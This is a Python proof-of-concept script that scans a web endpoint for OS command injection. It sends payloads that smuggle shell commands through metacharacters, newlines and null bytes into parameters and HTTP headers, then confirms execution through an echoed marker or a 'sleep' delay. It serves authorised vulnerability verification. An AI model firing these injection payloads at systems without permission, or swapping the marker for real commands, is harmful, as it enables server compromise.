#!/usr/bin/env python3
"""
PoC: OS Command Injection - VULN-CMDI-001

Vulnerability:
    OS Command Injection occurs when an application passes unsanitized user
    input to system shell commands. Attackers can append or inject arbitrary
    commands using shell metacharacters (;, |, &&, ||, $(), backticks),
    gaining the ability to execute arbitrary code on the server with the
    privileges of the application process.

Test methodology:
    1. Generate a unique marker string (UUID-based) for detection.
    2. Craft injection payloads using various shell metacharacters, each
       designed to echo the marker string into the response.
    3. Send payloads to multiple injection points (URL parameters, headers,
       POST body fields).
    4. Check if the marker string appears in the response, confirming
       that the injected command was executed.

Usage:
    python poc_command_injection_001.py --target http://localhost:8080 \\
        --endpoint "/api/ping" --param "host"

Exit codes:
    0 = CONFIRMED  (marker found in response, command was executed)
    1 = NOT_REPRODUCED  (marker not found in any response)
    2 = ERROR  (script encountered an error)

AUTHORIZED SECURITY TESTING ONLY.
"""

import argparse
import sys
import time
import uuid

try:
    import requests
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False


# ---------------------------------------------------------------------------
# Payload generation
# ---------------------------------------------------------------------------

def generate_payloads(marker, base_value="127.0.0.1"):
    """
    Generate OS command injection payloads using various shell metacharacters.
    Each payload includes 'echo <marker>' to produce a detectable output.

    Args:
        marker: Unique string to detect in the response.
        base_value: Benign value to prepend (simulates normal input).

    Returns:
        List of (name, payload) tuples.
    """
    echo_cmd = f"echo {marker}"

    return [
        # Semicolon - terminates previous command, runs new one
        (
            "Semicolon separator (;)",
            f"{base_value}; {echo_cmd}",
        ),
        # Pipe - pipes output to next command
        (
            "Pipe (|)",
            f"{base_value} | {echo_cmd}",
        ),
        # Logical AND - runs second command if first succeeds
        (
            "Logical AND (&&)",
            f"{base_value} && {echo_cmd}",
        ),
        # Logical OR - runs second command if first fails
        (
            "Logical OR (||)",
            f"invalid_value_that_fails || {echo_cmd}",
        ),
        # Command substitution with $()
        (
            "Command substitution $()",
            f"{base_value}$({echo_cmd})",
        ),
        # Command substitution with backticks
        (
            "Backtick substitution",
            f"{base_value}`{echo_cmd}`",
        ),
        # Newline injection
        (
            "Newline injection (\\n)",
            f"{base_value}\n{echo_cmd}",
        ),
        # Carriage return + newline
        (
            "CRLF injection (\\r\\n)",
            f"{base_value}\r\n{echo_cmd}",
        ),
        # Semicolon with null byte (bypass null-terminated string filters)
        (
            "Null byte + semicolon",
            f"{base_value}%00; {echo_cmd}",
        ),
        # Double ampersand without spaces (compact)
        (
            "Compact AND (&&) no spaces",
            f"{base_value}&&{echo_cmd}",
        ),
        # Nested command substitution
        (
            "Nested substitution",
            f"{base_value}$(echo $({echo_cmd}))",
        ),
        # Using printf instead of echo (alternate command)
        (
            "Printf variant",
            f"{base_value}; printf '{marker}'",
        ),
    ]


# ---------------------------------------------------------------------------
# Injection point definitions
# ---------------------------------------------------------------------------

def get_injection_points(args, payloads):
    """
    Define the injection points to test. Each injection point specifies
    how to deliver the payload to the target.

    Returns:
        List of (point_name, request_builder_func) tuples.
    """
    points = []

    # 1. Primary parameter (URL param for GET, body param for POST)
    points.append(("URL/body parameter", "param"))

    # 2. Additional parameters if specified
    if args.additional_params:
        for pair in args.additional_params.split(","):
            pair = pair.strip()
            if pair:
                points.append((f"Additional param: {pair}", f"extra:{pair}"))

    # 3. User-Agent header (some apps log/process this)
    if not args.skip_headers:
        points.append(("User-Agent header", "header:User-Agent"))

    # 4. Referer header
    if not args.skip_headers:
        points.append(("Referer header", "header:Referer"))

    # 5. X-Forwarded-For header (common in proxy setups)
    if not args.skip_headers:
        points.append(("X-Forwarded-For header", "header:X-Forwarded-For"))

    return points


# ---------------------------------------------------------------------------
# Request sending
# ---------------------------------------------------------------------------

def send_injection(args, payload, injection_type):
    """
    Send a single injection payload using the specified injection point.

    Args:
        args: Parsed command-line arguments.
        payload: The injection payload string.
        injection_type: Where to inject ("param", "header:Name", "extra:name").

    Returns:
        requests.Response object.
    """
    url = f"{args.target.rstrip('/')}{args.endpoint}"
    headers = {
        "User-Agent": "VulnAnalysis-PoC/1.0",
        "Accept": "*/*",
    }
    params = {}
    data = {}

    if args.cookie:
        headers["Cookie"] = args.cookie
    if args.auth_header:
        headers["Authorization"] = args.auth_header

    if injection_type == "param":
        # Inject into the primary parameter
        if args.method == "get":
            params[args.param] = payload
        else:
            data[args.param] = payload

    elif injection_type.startswith("header:"):
        # Inject into a specific header
        header_name = injection_type.split(":", 1)[1]
        headers[header_name] = payload
        # Still send a normal value for the primary parameter
        if args.method == "get":
            params[args.param] = args.base_value
        else:
            data[args.param] = args.base_value

    elif injection_type.startswith("extra:"):
        # Inject into an additional parameter
        extra_param = injection_type.split(":", 1)[1]
        if args.method == "get":
            params[args.param] = args.base_value
            params[extra_param] = payload
        else:
            data[args.param] = args.base_value
            data[extra_param] = payload

    if args.method == "get":
        return requests.get(
            url, params=params, headers=headers,
            timeout=args.timeout, allow_redirects=False,
        )
    else:
        return requests.post(
            url, data=data, headers=headers,
            timeout=args.timeout, allow_redirects=False,
        )


# ---------------------------------------------------------------------------
# Arguments
# ---------------------------------------------------------------------------

def parse_args():
    parser = argparse.ArgumentParser(
        description="PoC for OS Command Injection (VULN-CMDI-001)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="AUTHORIZED SECURITY TESTING ONLY.",
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8080",
        help="Base URL of the target application (default: http://localhost:8080)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Request timeout in seconds (default: 30)",
    )
    parser.add_argument(
        "--endpoint",
        default="/api/ping",
        help="Target endpoint to test (default: /api/ping)",
    )
    parser.add_argument(
        "--param",
        default="host",
        help="Primary parameter name to inject into (default: host)",
    )
    parser.add_argument(
        "--method",
        choices=["get", "post"],
        default="get",
        help="HTTP method (default: get)",
    )
    parser.add_argument(
        "--base-value",
        default="127.0.0.1",
        help="Benign base value for the parameter (default: 127.0.0.1)",
    )
    parser.add_argument(
        "--additional-params",
        default=None,
        help="Comma-separated list of additional parameter names to test as injection points",
    )
    parser.add_argument(
        "--skip-headers",
        action="store_true",
        help="Skip header-based injection tests",
    )
    parser.add_argument(
        "--cookie",
        default=None,
        help="Session cookie to include (e.g., 'session=abc123')",
    )
    parser.add_argument(
        "--auth-header",
        default=None,
        help="Authorization header value (e.g., 'Bearer token123')",
    )
    return parser.parse_args()


# ---------------------------------------------------------------------------
# Core test logic
# ---------------------------------------------------------------------------

def test_command_injection(args):
    """
    Execute the full command injection test suite.

    Returns:
        tuple: (exit_code, result_message)
    """
    vuln_id = "VULN-CMDI-001"
    target = args.target.rstrip("/")
    marker = f"CMDI_{uuid.uuid4().hex[:16]}"

    # -------------------------------------------------------------------------
    # Step 1: Connectivity check with benign request
    # -------------------------------------------------------------------------
    print("[*] Step 1: Connectivity check...")

    try:
        benign_resp = send_injection(args, args.base_value, "param")
    except requests.ConnectionError as exc:
        return 2, f"[ERROR] {vuln_id}: Connection failed to {target} - {exc}"
    except requests.Timeout:
        return 2, f"[ERROR] {vuln_id}: Request timed out after {args.timeout}s"
    except requests.RequestException as exc:
        return 2, f"[ERROR] {vuln_id}: Request error - {exc}"

    print(f"    Status: HTTP {benign_resp.status_code}")
    print(f"    Response size: {len(benign_resp.text)} bytes")

    # Verify the marker doesn't already exist in benign responses (false positive check)
    if marker in benign_resp.text:
        # Extremely unlikely with UUID-based markers, but check anyway
        marker = f"CMDI_{uuid.uuid4().hex[:16]}"
        print(f"    Regenerated marker (false positive prevention): {marker}")

    # -------------------------------------------------------------------------
    # Step 2: Generate payloads and injection points
    # -------------------------------------------------------------------------
    print(f"\n[*] Step 2: Preparing injection payloads (marker: {marker})...")

    payloads = generate_payloads(marker, args.base_value)
    injection_points = get_injection_points(args, payloads)

    print(f"    Payloads:         {len(payloads)}")
    print(f"    Injection points: {len(injection_points)}")
    print(f"    Total requests:   {len(payloads) * len(injection_points)}")

    # -------------------------------------------------------------------------
    # Step 3: Execute injection tests
    # -------------------------------------------------------------------------
    print(f"\n[*] Step 3: Executing injection tests...")

    confirmed = []
    errors = []
    test_count = 0
    total_tests = len(payloads) * len(injection_points)

    for point_name, injection_type in injection_points:
        print(f"\n  === Injection point: {point_name} ===")

        for payload_name, payload in payloads:
            test_count += 1
            progress = f"[{test_count}/{total_tests}]"

            # Truncate payload for display
            display_payload = payload.replace("\n", "\\n").replace("\r", "\\r")
            if len(display_payload) > 60:
                display_payload = display_payload[:57] + "..."

            print(f"    {progress} {payload_name}: {display_payload}")

            try:
                resp = send_injection(args, payload, injection_type)
            except requests.Timeout:
                print(f"         -> Timed out (possible blind injection)")
                continue
            except requests.RequestException as exc:
                print(f"         -> Error: {exc}")
                errors.append((point_name, payload_name, str(exc)))
                continue

            # Check for marker in response body
            body = resp.text
            marker_found = marker in body

            # Also check response headers (some commands may leak into headers)
            headers_str = str(resp.headers)
            marker_in_headers = marker in headers_str

            if marker_found or marker_in_headers:
                location = []
                if marker_found:
                    location.append("response body")
                    # Find context around marker
                    idx = body.find(marker)
                    start = max(0, idx - 30)
                    end = min(len(body), idx + len(marker) + 30)
                    context = body[start:end].replace("\n", "\\n")
                    print(f"         -> MARKER FOUND in body!")
                    print(f"         -> Context: ...{context}...")
                if marker_in_headers:
                    location.append("response headers")
                    print(f"         -> MARKER FOUND in headers!")

                confirmed.append({
                    "injection_point": point_name,
                    "payload_name": payload_name,
                    "payload": payload,
                    "status_code": resp.status_code,
                    "location": ", ".join(location),
                })
            else:
                # Check for common error messages that indicate the command was
                # attempted but failed (partial indicator)
                error_indicators = [
                    "sh:", "bash:", "/bin/sh:", "command not found",
                    "syntax error", "unexpected token",
                    "cannot execute", "permission denied",
                ]
                for indicator in error_indicators:
                    if indicator.lower() in body.lower():
                        print(f"         -> Shell error indicator: '{indicator}' (command was parsed)")
                        break

    # -------------------------------------------------------------------------
    # Step 4: Time-based blind injection test
    # -------------------------------------------------------------------------
    print(f"\n[*] Step 4: Time-based blind injection test...")

    # Measure baseline timing
    try:
        t0 = time.monotonic()
        send_injection(args, args.base_value, "param")
        baseline_time = time.monotonic() - t0
    except requests.RequestException:
        baseline_time = 1.0  # Assume 1s if baseline fails

    print(f"    Baseline response time: {baseline_time:.3f}s")

    # Try sleep-based payloads
    sleep_seconds = 5
    sleep_payloads = [
        ("Sleep via semicolon", f"{args.base_value}; sleep {sleep_seconds}"),
        ("Sleep via &&", f"{args.base_value} && sleep {sleep_seconds}"),
        ("Sleep via pipe", f"{args.base_value} | sleep {sleep_seconds}"),
        ("Sleep via $()", f"{args.base_value}$(sleep {sleep_seconds})"),
    ]

    for payload_name, payload in sleep_payloads:
        display_payload = payload.replace("\n", "\\n")
        print(f"    Testing: {payload_name}: {display_payload}")

        try:
            t0 = time.monotonic()
            resp = send_injection(args, payload, "param")
            elapsed = time.monotonic() - t0
        except requests.Timeout:
            elapsed = args.timeout
            print(f"         -> Timed out at {elapsed:.1f}s (strong blind injection indicator)")
            if elapsed >= sleep_seconds * 0.8:
                confirmed.append({
                    "injection_point": "URL/body parameter (blind)",
                    "payload_name": f"{payload_name} (time-based blind)",
                    "payload": payload,
                    "status_code": "timeout",
                    "location": f"time-based: {elapsed:.1f}s delay",
                })
            continue
        except requests.RequestException as exc:
            print(f"         -> Error: {exc}")
            continue

        print(f"         -> Response in {elapsed:.3f}s (baseline: {baseline_time:.3f}s)")

        # If response took significantly longer than baseline + sleep time
        expected_min = baseline_time + (sleep_seconds * 0.7)
        if elapsed >= expected_min:
            print(f"         -> TIME-BASED BLIND INJECTION DETECTED!")
            confirmed.append({
                "injection_point": "URL/body parameter (blind)",
                "payload_name": f"{payload_name} (time-based blind)",
                "payload": payload,
                "status_code": resp.status_code,
                "location": f"time-based: {elapsed:.1f}s vs {baseline_time:.3f}s baseline",
            })

    # -------------------------------------------------------------------------
    # Step 5: Results
    # -------------------------------------------------------------------------
    if confirmed:
        # Deduplicate by injection point + payload name
        unique_confirmed = []
        seen = set()
        for c in confirmed:
            key = (c["injection_point"], c["payload_name"])
            if key not in seen:
                seen.add(key)
                unique_confirmed.append(c)

        print(f"\n  {len(unique_confirmed)} confirmed injection(s):")
        for c in unique_confirmed:
            print(f"    - {c['injection_point']}: {c['payload_name']} "
                  f"(found in: {c['location']})")

        payload_names = ", ".join(c["payload_name"] for c in unique_confirmed[:3])
        suffix = f" (and {len(unique_confirmed) - 3} more)" if len(unique_confirmed) > 3 else ""

        return 0, (
            f"[CONFIRMED] {vuln_id}: OS command injection confirmed. "
            f"{len(unique_confirmed)} successful injection(s) via: {payload_names}{suffix}."
        )

    if errors:
        if len(errors) == total_tests:
            return 2, (
                f"[ERROR] {vuln_id}: All {len(errors)} requests failed. "
                f"Verify target and endpoint are correct."
            )

    return 1, (
        f"[NOT_REPRODUCED] {vuln_id}: Marker not found in any response across "
        f"{total_tests} test combinations. The parameter may be properly sanitized."
    )


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    args = parse_args()
    vuln_id = "VULN-CMDI-001"

    if not _HAS_REQUESTS:
        print("[ERROR] VULN-CMDI-001: 'requests' library is required. "
              "Install with: pip install requests")
        sys.exit(2)

    print("=" * 70)
    print("  PoC: OS Command Injection")
    print(f"  Vulnerability ID: {vuln_id}")
    print("=" * 70)
    print(f"  Target:    {args.target}")
    print(f"  Endpoint:  {args.endpoint}")
    print(f"  Parameter: {args.param}")
    print(f"  Method:    {args.method.upper()}")
    print(f"  Timeout:   {args.timeout}s")
    if args.skip_headers:
        print(f"  Headers:   skipped")
    print("=" * 70)
    print()

    start_time = time.monotonic()

    try:
        exit_code, message = test_command_injection(args)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(2)
    except Exception as exc:
        print(f"\n[ERROR] {vuln_id}: Unexpected error - {exc}")
        sys.exit(2)

    elapsed = time.monotonic() - start_time

    print()
    print("-" * 70)
    print(f"  Result:  {message}")
    print(f"  Elapsed: {elapsed:.2f}s")
    print("-" * 70)

    sys.exit(exit_code)


if __name__ == "__main__":
    main()
